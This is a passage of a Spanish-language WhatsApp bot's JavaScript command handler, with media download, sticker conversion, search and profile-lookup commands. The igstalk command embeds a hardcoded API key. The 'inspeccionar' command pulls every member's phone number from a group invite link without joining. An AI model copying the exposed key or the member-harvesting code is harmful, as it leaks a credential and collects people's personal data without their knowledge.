			const ytmp3 = `\`\`\`『 YOUTUBEPLAY MP3 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Kbps\n\n*• 🎫 Enlace :* ${yt3url.data}\n\n_Por favor espera I El audio se esta enviando_`
			kev.sendMessage(from, ytmp3, MessageType.text, { quoted: null, contextInfo: { externalAdReply : { title : `${res[0].judul}`, body : `${res[0].size}`, mediaType: 2, thumbnailUrl: `${res[0].thumb}`, mediaUrl : `${q}`} } } )
			await sleep(3000)
            kev.sendMessage(from, await getBuffer(res[0].link), "audioMessage", {mimetype: "audio/mp4", filename: `kevin.mp3`, quoted: vin} )
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
case 'buffervideo':
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
ytDonlodMp4(q)
			.then(async res => {
			yt4url = await axios.get(`https://tinyurl.com/api-create.php?url=${res[0].link}`)
			const ytmp4 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Mpg\n\n*• 🎫 Enlace :* ${yt4url.data}\n\n_Por favor espera I El video se esta enviando_`
			const ytmp42 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Mpg\n\n*• 🎫Enlace :* ${yt4url.data}`
			sendFileFromDts(from, `${res[0].link}`, ``, vin)
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
case 'bufferaudio':
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
ytDonlodMp3(q)
			.then( async res => {
			yt3url = await axios.get(`https://tinyurl.com/api-create.php?url=${res[0].link}`)
			const ytmp3 = `\`\`\`『 YOUTUBEPLAY MP3 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Kbps\n\n*• 🎫 Enlace :* ${yt3url.data}\n\n_Por favor espera I El audio se esta enviando_`
            kev.sendMessage(from, await getBuffer(res[0].link), "audioMessage", {mimetype: "audio/mp4", filename: `kevin.mp3`, quoted: vin} )
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
///
case 'sticker2':
case 's2':
case 'stiker2':
if (!isGroup && !yo)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if ((isMedia && !vin.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)                                     
await ffmpeg(`${media}`)
.input(media)
.on('start', async function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', async function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
})
.on('end', async function () {
console.log('listo')
const MatadataFix = {
        type: 'full',
        pack: 'Keͥ͢vͣıͫ͘͜𝜂',
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker2s = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix)
      kev.sendMessage(from, sticker2s, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
      fs.unlinkSync(media)  
      fs.unlinkSync(`./sticker/${senderfix}.webp`)  
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(200,iw)':min'(200,ih)': -loop 0,fps=15`])
.toFormat('webp')
.save(`./sticker/${senderfix}.webp`)
} else if ((isMedia && vin.message.videoMessage.seconds < 11 || isQuotedVideo && vin.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
const media = await kev.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
.on('end', async function () {
console.log('listo')
const MatadataFix2 = {
        type: 'full',
        pack: 'Keͥ͢vͣıͫ͘͜??',
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker3s = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix2)
      kev.sendMessage(from, sticker3s, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
fs.unlinkSync(media)  
fs.unlinkSync(`./sticker/${senderfix}.webp`)  
})
//.addOutputOptions([`ffmpeg -i ${media} -vcodec libwebp -filter:v,fps=15,-lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`])
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(200,iw)':min'(200,ih)': -loop 0,fps=15`])
.toFormat('webp')
.save(`./sticker/${senderfix}.webp`)
} else {
reply(`Envíe una foto/video + el comando ${prefix}sticker2\n\nTambién funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duración máxima del video es de 10 segundos`)
}
break

    case 'sticker':
        case 'stiker':
        case 's':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (isMedia && !vin.message.videoMessage || isQuotedImage) {
      const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
      const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)
      await ffmpeg(`${media}`)
      .input(media)
      .on('start', function (cmd) {
      console.log(`Started : ${cmd}`)
      })
      .on('error', function (err) {
      console.log(`Error : ${err}`)
      fs.unlinkSync(media)
      reply('error')
        })
      .on('end', async function () {
      console.log('Finish')
      const MatadataFix3 = {
        type: 'full',
        pack: 'Keͥ͢vͣıͫ͘͜𝜂',
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker4s = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix3)
      kev.sendMessage(from, sticker4s, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
      fs.unlinkSync(media)  
      fs.unlinkSync(`./sticker/${senderfix}.webp`)  
      })
      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
      .toFormat('webp')
      .save(`./sticker/${senderfix}.webp`)
      } else if ((isMedia && vin.message.videoMessage.fileLength < 10000000 || isQuotedVideo && vin.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
      const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
      const media = await kev.downloadAndSaveMediaMessage(encmedia, `./sticker/${senderfix}`)
      reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
      await ffmpeg(`${media}`)
      .inputFormat(media.split('.')[4])
      .on('start', function (cmd) {
      console.log(`Started : ${cmd}`)
      })
      .on('error', function (err) {
      console.log(`Error : ${err}`)
      fs.unlinkSync(media)
      tipe = media.endsWith('.mp4') ? 'video' : 'gif'
      })
      .on('end', async function () {
      console.log('Finish')
      const MatadataFix4 = {
        type: 'full',
        pack: 'Keͥ͢vͣıͫ͘͜𝜂',
        author: '',
        categories: [
            '🌹'
        ]
        }
      const sticker5s = await createSticker(`./sticker/${senderfix}.webp`, MatadataFix4)
      kev.sendMessage(from, sticker5s, MessageType.sticker, {quoted: vin, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
      fs.unlinkSync(media)
      fs.unlinkSync(`./sticker/${senderfix}.webp`)
      })
      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
      .toFormat('webp')
      .save(`./sticker/${senderfix}.webp`)
          } else {
      reply(`Envíe una foto/video + el comando ${prefix}sticker\n\nTambién funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duración máxima del video es de 10 segundos`)
      }
        break             
    case 'toimg':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedSticker) return reply('Menciona el sticker que deseas convertir a imagen')
            const toimg2 = JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo
            const toimg3 = await kev.downloadAndSaveMediaMessage(toimg2)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            ran = getRandom('.png')
            exec(`ffmpeg -i ${toimg3} ${ran}`, (err) => {
            fs.unlinkSync(toimg3)
            if (err) {
            reply(`Error solo stickers estaticos\n\nPor favor si quieres transformar un sticker animado a video usa el comando *${prefix}tomp4*`)
            } else {
            buffer = fs.readFileSync(ran)
            kev.sendMessage(from, buffer, image, {quoted: vin, caption: '*Sticker Transformado A Imagen*'})
            fs.unlinkSync(ran)
            }
            })
            break
	case 'ytbusqueda':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
			if (args.length < 1) return reply('Que deseas buscar?!')
			var srch = args.join('');
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await kev.sendMessage(from, 'Error En La Busqueda!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '🧇 *「 Youtube Busqueda 」 🧇*'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += ' *🧇 Título:* ' + video.title + '\n\n'
            ytresult += ' *🧇 Enlace:* ' + video.url + '\n\n'
            ytresult += ' *🧇 Duración:* ' + video.timestamp + '\n\n'
            ytresult += ' *🧇 Subido:* ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += ' *🧇 *SELF BY KEVIN* 🧇'
    		await fakethumb(tbuff,ytresult)
			break
//Comandos Terminados:	
case 'emoji':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!q) return reply('Y el emoji?')
            qes = args.join(' ')
            emoji.get(`${qes}`).then(emoji => {
            const emojitext = `${emoji.images[4].url}`
            sendStickerFromUrl(from,`${emojitext}`) 
            console.log(emojitext)
            })
            break
case 'google':
  if (!q) return reply('Que quieres buscar en google?')
  reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
   _url = 'https://google.com/search?q='+encodeURIComponent(q)
   _search = await googleIt({ query: q })
   _msg = ''
   for (let i of _search) {
   _msg += `*𝕱⃝🧇 ∙ Resultados Sobre:* _${_url}_
   
*𝕱⃝🧇 ∙ Título:* _${i.title}_

*𝕱⃝🧇 ∙ Enlace:* _${i.link}_

*𝕱⃝🧇 ∙ Descripción:* _${i.snippet}_

*• > 🧇🧇🧇🧇🧇🧇🧇🧇🧇🧇🧇🧇 < •*\n\n\n
`
   }
  try {
  	ss = await getBuffer(`https://nurutomo.herokuapp.com/api/ssweb?url=${_url}`)
	await kev.sendFile(from, ss, 'screenshot.png', `*🧇「 B̷ú̷s̷q̷u̷e̷d̷a̷ e̷n̷ G̷o̷o̷g̷l̷e̷ 」🧇*` + '\n\n' + _msg, vin)
  } catch (e) {
    reply(_msg)
  }
  break
    case 'imagen':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!q) return reply('Que imagen deseas buscar?')
let gis = promisify(_gis)
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
  for (let i = 0; i < 1; i++) {
  results = await gis(`${q}`) || []
  let { url, width, height } = pickRandom(results) || {}
  if (!url) return reply('Error, No pude descargar ninguna imágen')
  kev.sendFile(from, url, null,`*🧇「 I̷m̷á̷g̷e̷n̷e̷s̷ D̷e̷ G̷o̷o̷g̷l̷e̷ 」🧇* 

*𝕱⃝🧇 ∙ Resultado de:* _${q}_

*𝕱⃝🧇 ∙ Tamaño:* _${width} x ${height} Píxeles_

*𝕱⃝🧇 ∙ Enlace:* _${url}_
`.trim(), vin, false,{thumbnail: fakeimg})
}
            break
    case 'tiktok':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`El enlace debe ser de tiktok....\nEjemplo:\n*${prefix}tiktok https://vm.tiktok.com/ZMRXPbCkp/*`)
        if (!arg) return reply('Y el enlace de tiktok?')
        reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
anu = await TiktokDownloader(`${q}`)
.then((data) => { kev.sendFile(from, data.result.nowatermark,null, `*📥 Kevin Download • Tiktok 📥*`, vin) })
.catch((err) => { reply(String(err)) })
            break
case 'igdl':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(`El enlace debe ser de instagram....\nEjemplo:\n*${prefix}igdl https://www.instagram.com/reel/CTtWNh-lTmf/?utm_medium=copy_link*`)
        if (!arg) return reply('Necesitas enviar el enlace de lo que quieres descargar de instagram')
        reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
      anu = await igDownloader(`${q}`)
             .then((data) => { kev.sendFile(from, data.result.link, null,`*📥 Kevin Download • Instagram 📥*`, vin) })
             .catch((err) => { reply(String(err)) })
      break
case 'zalgo':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (args.length < 1) return reply("Necesitas enviar un texto junto al comando!")
reply(zalgo(`${arg}`))
break
case 'tiktokstalk':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
    try {
      if (args.length < 1) return reply(`Use ${prefix}tiktokstalk "usuario"`)
      reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
        let { user, stats } = await tiktod.getUserProfileInfo(args[0])
      upcaption = `*🧇 「 Tiktok Stalk 」 🧇*

*• 👤 Nombre de usuario:*  ${user.uniqueId}

*• 👤 Nombre:*  ${user.nickname}

*• 👥 Seguidores:*  ${stats.followerCount}

*• 👥 Seguidos:*  ${stats.followingCount}

*• ?? ID:*  ${user.id}

*• 📝 Publicaciones:*  ${stats.videoCount}

*• ♥️ Luv:*  ${stats.heart}

*• 📥 Enlace:*  https://www.tiktok.com/@${q}?lang=en`
      buffer = await getBuffer(user.avatarLarger)
      kev.sendMessage(from, buffer, MessageType.image, {quoted: vin, caption: upcaption})
      } catch (e) {
      console.log(`Error :`, color(e,'red'))
      reply('NOMBRE DE USUARIO INVALIDO')
      }
    break
case 'igstalk':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                    if (args.length == 0) return reply(`Use ${prefix}igstalk "usuario"`)
                    ini_result = await fetchKev(`https://fxc7-api.herokuapp.com/api/stalk/ig?apikey=bcpoAqRL&username=${q}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.hd_profile_pic_url_info.url)
                    ini_txt = `*🧇 「 Instagram Stalk 」 🧇*

*• 👤 Nombre De Usuario:*  ${ini_result.username}

*• 👤 Nombre:*  ${ini_result.full_name}

*• 📝 Publicaciones:*  ${ini_result.media_count}

*• 👥 Seguidores:*  ${ini_result.follower_count}

*• 👥 Seguidos:*  ${ini_result.following_count}

*• ♥️ Biografia:*  ${ini_result.biography}

*• ✅ Cuenta Verificada:* ${ini_result.is_verified}

*• 📵 Cuenta Privada:* ${ini_result.is_private}

*• 🎥 Cantidad De Media:* ${ini_result.media_count}

*• 👨🏻‍💼 Cuenta De Empresa:* ${ini_result.is_business}

*• 📥 Enlace:* https://www.instagram.com/${q}

*• 📥 Enlaces Externos:* ${ini_result.external_url}`
                    kev.sendMessage(from, ini_buffer, MessageType.image, { quoted: vin, caption: ini_txt, sendEphemeral: true})
                    break
case 'facebook':
case 'fb':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (args.length < 1) return reply(`Ejemplo: ${prefix + comm} https://www.facebook.com/alanwalkermusic/videos/277641643524720/`)
if(!isUrl(args[0]) && !args[0].includes('facebook')) return kev.sendMessage(from, 'El enlace debe ser de facebook.', MessageType.text, fakevin)
const filetext = (q)
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
res = await fbDown(filetext).catch(e => {
  reply(mess.ferr)
})
a = res[0]
result = `*🧇 「 Facebook Mp4 」 🧇*

*• 🧇 Resultado de :* ${arg}

 *🧇 Título :* ${a.judul}

 *🧇 Subido Por :* ${a.source}

 *🧇 Tamaño :* ${a.size}

 *🧇 Calidad :* ${a.quality}

 *🧇 Tipo :* ${a.type}

 *🧇 Nombre De Archivo :* ${a.judul}.${a.type}`
sendFileFromUrl(a.link, MessageType.video, { caption: result, mimetype: 'video/mp4',quoted: vin, filename: `${a.judul}.${a.type}`})
break

    case 'entrar':
    if (!yo && !isOwner)return 
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return kev.sendMessage(from, 'Debe ser enlace de algún grupo.', MessageType.text, fakevin)
            hen = args[0]
            if (!q) return reply('Y el enlace??')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return reply ('asegúrese de que el enlace sea correcto!')
            var response = await kev.acceptInvite(codeInvite)
            reply('Listo !')
            } catch {
            reply('Enlace Erróneo!')
            }
            break
    case 'twitter':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return kev.sendMessage(from, 'Debe ser enlace de twitter.', MessageType.text, fakevin)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            if (!q) return reply('Enlace Del Video??')
            ten = q
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'', vin)
            })
        break
    case 'runtime':
    case 'stats':
    case 'test':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
    var ram3 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 500 / 500)}MB`
runtmenusitooo = process.uptime()
let runtttt = runtime(runtmenusitooo)
let mno = await kev.chats.all()
        let i4 = []
        let guud = []
        for (let mem of mno){
          i4.push(mem.jid)
        }
        for (let id of i4){
          if (id && id.includes('g.us')){
            guud.push(id)
          }
        }
denix = `*🧇「 E̷s̷t̷a̷d̷í̷s̷t̷i̷c̷a̷s̷ D̷e̷l̷ B̷o̷t̷ 」🧇* 

*𝕷⃝🧇 ∙ ᴜsᴏs  :* _${hit_today.length}_
*𝕷⃝🧇 ∙ ᴇsᴛᴀᴅᴏ ᴅᴇ ʙᴀᴛᴇʀɪ́ᴀ :* _${baterai}%_
*𝕷⃝🧇 ∙ ᴄᴀʀɢᴀᴅᴏʀ ᴄᴏɴᴇᴄᴛᴀᴅᴏ :* _${charging}_
*𝕷⃝🧇 ∙ ᴄʜᴀᴛs ᴅᴇ ɢʀᴜᴘᴏs :* _${guud.length} ɢʀᴜᴘᴏs_
*𝕷⃝🧇 ∙ ᴄʜᴀᴛs ᴘᴇʀsᴏɴᴀʟᴇs :* _${mno.length - guud.length} ᴍᴇɴsᴀᴊᴇs_
*𝕷⃝🧇 ∙ ᴛᴏᴛᴀʟ ᴅᴇ ᴄʜᴀᴛs :* _${mno.length}_
*𝕷⃝🧇 ∙ ᴅɪsᴘᴏsɪᴛɪᴠᴏ :* _${kev.user.phone.device_manufacturer}_

         *🧇「 T̷e̷l̷e̷f̷o̷n̷o̷ 」🧇* 

*𝕷⃝🧇 ∙ ᴍᴏᴅᴇʟᴏ ᴅᴇ ᴅɪsᴘᴏsɪᴛɪᴠᴏ :* _P40 Pro_
*𝕷⃝🧇 ∙ ʀᴀᴍ ᴅɪsᴘᴏsɪᴛɪᴠᴏ :* _${ram3}_
*𝕷⃝🧇 ∙ ᴡᴀ ᴠᴇʀsɪᴏ́ɴ :* _${kev.user.phone.wa_version}_
*𝕷⃝🧇 ∙ ᴍᴄᴄ :* _510_
*𝕷⃝🧇 ∙ ᴍɴᴄ :* _011_
*𝕷⃝🧇 ∙ ᴏs ᴠᴇʀsɪᴏɴ :* _11_
*𝕷⃝🧇 ∙ ᴛɪᴘᴏ ᴅᴇ ᴏs :* _Ubuntu_
*𝕷⃝🧇 ∙ ᴏs ʀᴇʟᴇᴀsᴇ :* _${kev.user.phone.device_manufacturer}_

         *🧇「 S̷e̷r̷v̷i̷d̷o̷r̷ 」🧇* 

*𝕷⃝🧇 ∙ ᴛᴍᴘ ʙᴀsᴜʀᴀ :* _/temp_
*𝕷⃝🧇 ∙ ᴀʀᴄʜ :* _${os.platform()}_
*𝕷⃝🧇 ∙ ɴᴏᴍʙʀᴇ ᴅᴇ ʜᴏsᴛ :* _${os.hostname()}_
*𝕷⃝🧇 ∙ ᴠᴇʀsɪᴏ́ɴ ᴅᴇ sᴇʀᴠɪᴅᴏʀ :* _20.04.3_
*𝕷⃝🧇 ∙ ᴜᴘᴛɪᴍᴇ :* _${os.uptime()}_
*𝕷⃝🧇 ∙ ʀᴜɴᴛɪᴍᴇ :* _${runtttt}_`
kev.sendMessage(from, fs.readFileSync('./media/loading.mp4'), video, {quoted : vin, mimetype: 'video/gif', caption: denix})
    break  
    case 'speed':
    case 'ping':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            const timestamp = speed();
            const latensi = speed() - timestamp
            exec(`neofetch --stdout`, (error, stdout, stderr) => {
            const child = stdout.toString('utf-8')
            const teks = child.replace(/Memory:/, "Ram:")
            const pingnya = `*${teks}Velocidad: ${latensi.toFixed(4)} Segundos*`
            kev.sendMessage(from, `${pingnya}`, MessageType.text, {quoted: vin})
            })
            break

case 'tomp4':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !vin.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            owgi = await kev.downloadAndSaveMediaMessage(ger)
            kev.sendMessage(from, `Por favor espera...`, MessageType.text, fakevin)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result, '*Sticker Transformado A Video*', vin)
            })
            }else {
            kev.sendMessage(from, `Error solo stickers animados\n\nPor favor si quieres transformar un sticker estatico a imagen usa el comando *${prefix}toimg*` , MessageType.text, { quoted: vin, sendEphemeral: true})
            }
            fs.unlinkSync(owgi)
            break
case 'tourl':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !vin.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
            owgi = await kev.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            kev.sendMessage(from, 'Menciona una imagen o un video.', MessageType.text, fakevin)
            }
            break
    case 'inspeccionar':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return kev.sendMessage(from, 'Debe ser enlace de algún grupo.', MessageType.text, fakevin)
            if (!q) return reply('Y el enlace?')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('Solo enlaces: https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await kev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id del grupo* : ${id}
${owner ? `*Creador* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nombre del grupo* : ${subject}
*Fecha de creación del grupo* : ${formatDate(creation * 1000)}
*Cantidad de miembros* : ${size}
${desc ? `*Descripción* : ${desc}` : '*Desc* : tidak ada'}
*Id Descripción* : ${descId}
${descOwner ? `*Descripción modificada por* : @${descOwner.split('@')[0]}` : '*Descripción modificada por* : -'}\n*Fecha* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Contactos guardados*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Si' : 'No'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
